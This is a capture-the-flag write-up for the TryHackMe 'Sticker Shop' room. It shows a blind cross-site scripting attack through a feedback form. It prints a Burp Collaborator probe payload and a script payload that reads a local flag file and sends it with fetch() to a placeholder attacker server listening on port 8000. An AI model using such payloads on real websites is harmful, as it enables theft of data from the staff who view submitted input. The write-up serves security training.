TryHackMe: The Sticker Shop

The website consists of two pages -

Home
Displays a simple interface with cat stickers etc.
No vulnerabilities were found here.

Submit Feedback PagePermalink
Contains a feedback form with a textarea for users to submit their comments.
The form sends a POST request to /submit_feedback.

Initial ObservationsPermalink
The feedback form allows user-supplied input, which could be a potential injection point for attacks like Cross-Site Scripting (XSS).

The response to a normal feedback submission is: Thanks for your feedback! It will be evaluated shortly by our staff.

Blind XSS DiscoveryPermalink
used Burp-collaborator to check if the Blind XSS is exsist or not
Payload used :
'"><script src=https://xyzh5f7ugxnj7919kl6eqcaohfn6bxzm.oastify.com></script>`

After submitting the payload in the feedback form, I observed a DNS interaction logged in Burp Collaborator, confirming the execution of the payload.






Exploitation Process
1. Setting Up the Listener

To capture the exfiltrated data, an HTTP server was set up on the attacker’s machine:

python3 -m http.server 8000
This server listens for incoming requests, which will contain the sensitive data exfiltrated from the target.

2. Crafting the Exploit Payload

The goal of the exploit was twofold:

Retrieve the flag located at http://127.0.0.1:8080/flag.txt.
Exfiltrate the data to the attacker’s HTTP server.
The crafted payload was as follows:

'"><script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://<YOUR-IP-ADDRESS>:8000/?flag=' + encodeURIComponent(data));
    });
</script>
The payload first fetches the flag from the target server, encodes it to ensure safe transmission, and sends it to the attacker’s server via a GET request.


The flag.txt is base64 encoded. To decode it, you can use the terminal or visit dencode.com, paste your encoded string, and retrieve the flag.
